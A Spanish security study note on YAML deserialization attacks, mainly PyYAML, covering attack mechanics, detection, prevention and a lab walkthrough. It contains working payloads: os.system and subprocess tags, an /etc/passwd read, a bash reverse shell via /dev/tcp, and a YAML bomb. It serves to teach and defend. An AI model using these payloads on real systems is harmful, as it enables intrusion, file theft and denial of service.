---
aliases: ["DES-Yaml Attack", "YAML Deserialization Vulnerability", "PyYAML RCE"]
tags:
  - sec/web
  - sec/web/deserializacion
  - sec/lenguajes/python
tipo: concepto
estado: terminado
creado: 2026-10-11
actualizado: 2026-10-11
relacionado:
  - "[[Ataques de Deserialización]]"
  - "[[Ataque de Deserialización Pickle]]"
  - "[[OS Command Injection]]"
  - "[[Local File Inclusion]]"
fuente: "https://portswigger.net/web-security/deserialization"
---

# Ataque de Deserialización YAML (DES-Yaml)

Un **Ataque de Deserialización YAML** (**DES-Yaml**) ocurre en aplicaciones que usan **YAML** para deserializar datos controlados por el atacante con una API insegura (`yaml.load()` en PyYAML, `Yaml.load` de SnakeYAML en Java, `YAML.load` en Ruby psych, etc.). YAML es un formato **de datos**, pero sus librerías históricas implementan **tags de tipos** que pueden instanciar objetos arbitrarios y ejecutar funciones — el mismo problema de [[Ataques de Deserialización]], servido en formato de texto legible.

> [!info] ¿Qué es YAML?
> YAML se autodenomina recursivemente **"YAML Ain't Markup Language"** (originalmente "Yet Another Markup Language"). Es un formato de serialización legible para humanos que soporta estructuras complejas, referencias (`&ancora` / `*referencia`) y, crucialmente, **tags de tipo explícitos** (`!!tipo`) que mapean directamente a clases del lenguaje. Esos tags son el mecanismo de RCE: `!!python/object/apply` le dice al cargador Python "llama a esta función con estos argumentos".

> [!warning] `yaml.load()` es RCE — sin excepciones útiles
> Con PyYAML, `yaml.load(user_input)` ejecuta código arbitrario vía tags `!!python/object/apply:os.system`, `!!python/object/new:...`, etc. La deserialización es *la* vulnerabilidad, no un paso previo: el daño ocurre durante el parseo del texto.

## Mecánica: tags, loaders y por qué existe el RCE

YAML distingue **escalares** (`"texto"`, `42`, `true`) de **nodos etiquetados** (`!!python/object/apply:...`). El loader decide qué tags acepta:

| Loader (PyYAML) | Tags permitidos | Resultado |
|---|---|---|
| `yaml.safe_load` (`SafeLoader`) | Solo tipos YAML estándar (map, seq, str, int...) | **Seguro**: rechaza tags python |
| `yaml.load` (sin Loader, PyYAML <5.1) | Todos (`FullLoader` implícito) | **RCE** |
| `yaml.full_load` (`FullLoader`) | Tipos python "seguros" (limitado; RCEs históricas por bypass) | No usar con datos externos |
| `yaml.unsafe_load` / `UnsafeLoader` | Todos | **RCE** explícita |
| `yaml.load(..., Loader=yaml.Loader)` | Todos | **RCE** |

Tags ofensivos clásicos de PyYAML:

| Tag | Efecto |
|---|---|
| `!!python/object/apply:os.system ['id']` | Ejecuta `os.system('id')` |
| `!!python/object/apply:subprocess.check_output [['cat','/flag']]` | Ejecuta y devuelve la salida |
| `!!python/object/new:os.system ['id']` | `os.system.__new__(...)` — variante |
| `!!python/object/apply:eval ["__import__('os').popen('id').read()"]` | Eval arbitrary |
| `!!python/name:os.system` | Referencia a función (combina con `apply`) |

En el ecosistema JVM el patrón es idéntico: SnakeYAML `new Yaml().load(input)` con `!!javax.script.ScriptEngineManager` produce RCE (cadenas gadget documentadas en el ecosistema Java — ver [[Ataques de Deserialización]]). En Ruby, `Psych.load` (alias de `YAML.load`) reconstruye objetos con `init_with`/`marshal` — RCE vía gadgets.

### YAML bomb (denegación de servicio sin RCE)

Las referencias anidadas de YAML permiten expansión exponencial — el equivalente al "billion laughs" de XML (ver [[XML External Entity Injection]] para el primo XXE):

```yaml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
# ... cada nivel multiplica ×9 → un fichero de pocos KB explota a GB de RAM
```

Incluso con `safe_load` esto funciona (es formato válido): **toda deserialización de YAML externo necesita límites de recursos** (tamaño máximo de input, timeout, o streaming con `yaml.compose` acotado).

## Metodología de ataque

1. **Localizar YAML**: parámetros que contienen `key: value`, respuestas `Content-Type: application/yaml`, ficheros `.yml`/`.yaml` descargables/cargables, headers personalizados, cookies con base64 que decodifica a texto con sangrías, pipelines CI/CD.
2. **Confirmar el parser**: enviar YAML benigno (`a: 1`) y ver si se interpreta; enviar `!!python/object/apply:os.popen ['sleep 5']` y medir timing (confirmación ciega).
3. **Codificación del canal**: muchos envían el YAML en base64 (como la práctica de abajo) — `echo '<payload>' | base64` y sustituir el parámetro.
4. **Explotar** con salida visible si es posible (`subprocess.check_output` → el resultado aparece en la respuesta renderizada del objeto) o out-of-band (fichero, reverse shell, `curl` a colaborador).
5. **DoS**: si no hay RCE, probar la YAML bomb contra el mismo endpoint.

### Payloads de referencia

```yaml
# RCE básica (PyYAML unsafe)
!!python/object/apply:subprocess.check_output [["id"]]

# Lectura de fichero
!!python/object/apply:subprocess.check_output [["cat", "/etc/passwd"]]

# Reverse shell vía os.system
!!python/object/apply:os.system ['bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"']
```

Codificación típica para entregar por parámetro:

```bash
echo '!!python/object/apply:subprocess.check_output [["ls -la"]]' | base64
```

## Detección

- El parámetro viaja en base64 y, al decodificar, aparecen `!!python/`, sangrías YAML o estructura `key: value` inesperada en un entorno JSON.
- Errores del servidor: `yaml.constructor.ConstructorError`, stack traces con `yaml/loader.py`, `ScannerError`, `composer found character that cannot start any token`.
- En Java: `ConstructorException` de SnakeYAML / `ClassNotFound` con nombres de clase inyectados.
- Firma WAF: patrones `!!python`, `object/apply`, `!!javax` — pero el simple hecho de buscar tags `!!` en inputs es una detección barata y efectiva.

## Impacto

RCE completa (mismas consecuencias que el pickle: ficheros, shells, red interna) o DoS por expansión. El vector de entrega típico es un parámetro de "preferencias", "config" o "metadata" que el equipo creyó conveniente dejar en formato humano-legible. En apps Java con SnakeYAML desactualizado, la combinación `!!javax.script.ScriptEngineManager` da RCE con solo enviar un fichero YAML en un upload o parámetro.

## Prevención (con código)

```python
import yaml

# ✅ SEGURO: solo tipos de datos primitivos
data = yaml.safe_load(user_input)

# ❌ PELIGROSO: cualquier tag python se ejecuta
# data = yaml.load(user_input)                  # PyYAML <6: RCE
# data = yaml.load(user_input, Loader=yaml.Loader)
# data = yaml.unsafe_load(user_input)
```

```java
// Java / SnakeYAML — por defecto inseguro desde versiones antiguas
Yaml yaml = new Yaml(new SafeConstructor(new LoaderOptions()));  // solo tipos básicos
Object data = yaml.load(input);
```

```ruby
# Ruby psych >= 4: YAML.load es SafeLoader por defecto; no "mejorar" a unsafe
data = YAML.safe_load(input, permitted_classes: [Symbol, Date])
# YAML.unsafe_load / Psych.load (viejo) = reconstrucción de objetos → RCE
```

Reglas de diseño:

- **Formato de datos, no de objetos**: si solo necesitas estructuras, JSON cumple igual y no tiene tags. YAML solo donde aporte legibilidad real (config de infraestructura propia, no inputs de usuario).
- Límites: tamaño máximo de input, timeout de parseo, profundidad acotada (anti-bomb).
- Firmar (HMAC) cualquier YAML que viaje entre servicios propios, como en el caso de pickle.
- Actualizar PyYAML ≥6 (obliga a pasar `Loader` explícito, haciendo explícito el error) — pero el cambio correcto sigue siendo `safe_load`.

> [!warning] Corrección técnica de la nota original
> Decía que "en las últimas versiones el uso de `safe_load` es obligatorio". Matiz: **PyYAML 6.0 hace obligatorio pasar el argumento `Loader`** a `yaml.load` (sin él lanza `TypeError`), pero `yaml.load(x, Loader=yaml.Loader)` sigue siendo RCE perfectamente legal. Lo obligatorio *de seguridad* es elegir `safe_load`/`SafeLoader`; ninguna versión lo hace por ti.

## Errores comunes

**Atacante:**
1. Enviar el payload raw cuando el canal espera base64 (o viceversa) — mirar siempre cómo llega el dato original.
2. Probar RCE sin medir timing: sin salida visible usa `sleep 5`/`time.sleep(5)` para confirmar ejecución antes de iterar.
3. Olvidar que `safe_load` rechaza el tag: si la app es safe, no pierdas tiempo — pasa a la YAML bomb o a otra superficie.
4. Usar sintaxis de anclas mal formada en la bomb (falta de sangría YAML rompe el parseo).

**Defensor (falsas soluciones):**
1. "Filtro la cadena `!!python`": se evade con tags alternativos, con loaders que resuelven `python/object` bajo alias, y no cubre bombs.
2. Sanitizar pero seguir usando `yaml.load` con Loader inseguro.
3. Asumir que "YAML es seguro como JSON" — no lo es por sus tags; solo `safe_load` lo es.
4. Bloquear el RCE pero no acotar recursos: la bomb sigue viva.

## Cheatsheet

| Tarea | Comando / sintaxis |
|---|---|
| Confirmar unsafe (timing) | `!!python/object/apply:time.sleep [5]` |
| RCE | `!!python/object/apply:os.system ['id']` |
| Lectura con salida | `!!python/object/apply:subprocess.check_output [["cat","/flag"]]` |
| Codificar para parámetro | `echo '<payload>' \| base64` |
| DoS (bomba) | anclas `&a`/`*a` anidadas ×9 por nivel |
| Loader seguro (defensa) | `yaml.safe_load()` / `SafeConstructor` |
| Analizar sin ejecutar | inspección manual + `yaml.compose` con SafeLoader |

| Tag / patrón | Significado |
|---|---|
| `!!python/object/apply` | PyYAML RCE directa |
| `!!javax.script` | SnakeYAML RCE (Java) |
| `key: value` con sangría en parámetro "JSON" | El parser es YAML |
| `&ancora` / `*ref` repetidos | Posible bomb |

## Notas de la práctica

Tenemos la siguiente web donde vemos en realidad algo extraño en la URL, por lo que vamos a copiar esa cadena y llevarla a la consola:

![[Pasted image 20260227190542.png]]

Vemos que tenemos el mismo texto que está en la web, claro, este se encuentra en Base64:

![[Pasted image 20260227190720.png]]

> [!tip] Decodificación Base64
> La codificación Base64 es comúnmente utilizada para transmitir datos binarios a través de medios que solo manejan texto. En el contexto de ataques web, a menudo se usa para ofuscar parámetros o payloads, requiriendo decodificación antes de su análisis o manipulación. Puedes decodificarlo fácilmente con `echo "cadena_base64" | base64 -d`.

Intentemos pasarle otra cosa usando la sintaxis a ver si esto funciona:

```bash
echo "Hola Mundo" | base64
```

![[Pasted image 20260227190837.png]]

Le pasamos el contenido a la URL:

![[Pasted image 20260227190859.png]]

Como vemos, sí se inserta el texto como esperábamos. Ahora podemos asumir que se está confiando en el usuario, algo que no se debe hacer nunca.

Nosotros en YAML podemos usar sentencias maliciosas, las cuales pueden ser interpretadas y ejecutadas en el proceso.

Primero, la forma fácil en la que podemos pasar datos de texto usual a YAML es mediante Python. Debemos tener una estructura de datos como la siguiente:

![[Pasted image 20260227191452.png]]

Luego, realizamos lo siguiente dentro del intérprete de Python o mediante un script:

```python
import yaml
data = {'name': 'John Doe', 'age': 30}
yaml_data = yaml.dump(data)
print(yaml_data)
```

![[Pasted image 20260227191920.png]]

Ahora vamos a construir el payload malicioso que la aplicación deserializará con su `yaml.load()` inseguro:

```python
import yaml
import base64

# Payload malicioso para ejecutar un comando
# !!python/object/apply:subprocess.check_output ['ls -la']
malicious_yaml = "!!python/object/apply:subprocess.check_output ['ls -la']"

# Codificar el payload en Base64 para entregarlo por el parámetro
echo_payload = base64.b64encode(malicious_yaml.encode()).decode()
print(echo_payload)
```

![[Pasted image 20260227192242.png]]

Vemos qué sucede si decodificamos eso:

![[Pasted image 20260227192307.png]]

Como observamos, logramos una ejecución de comandos: el servidor hizo `yaml.load(base64decode(param))` y el tag `!!python/object/apply` invocó `subprocess.check_output(['ls -la'])` durante el parseo.

## Laboratorios y referencias

- PortSwigger Academy — Insecure deserialization (contexto general): https://portswigger.net/web-security/deserialization
- PyYAML docs (seguridad): https://github.com/pyyaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation
- SnakeYAML deserialization (RCE documented): https://github.com/mbechler/marshalsec
- OWASP — YAML deserialization: https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data
- HackTricks — YAML python: https://book.hacktricks.xyz/pentesting-web/deserialization#python-yaml

## Relacionadas

- [[Ataques de Deserialización]] — paraguas: comparativa por lenguaje, gadget chains, POP chains
- [[Ataque de Deserialización Pickle]] — el otro RCE de Python, a nivel de bytecode en vez de texto
- [[OS Command Injection]] — mismo impacto (RCE) sin pasar por objetos
- [[XML External Entity Injection]] — la "YAML bomb" es prima hermana del "billion laughs" XXE
- [[Local File Inclusion]] — lectura de ficheros como impacto mínimo de estas cargas
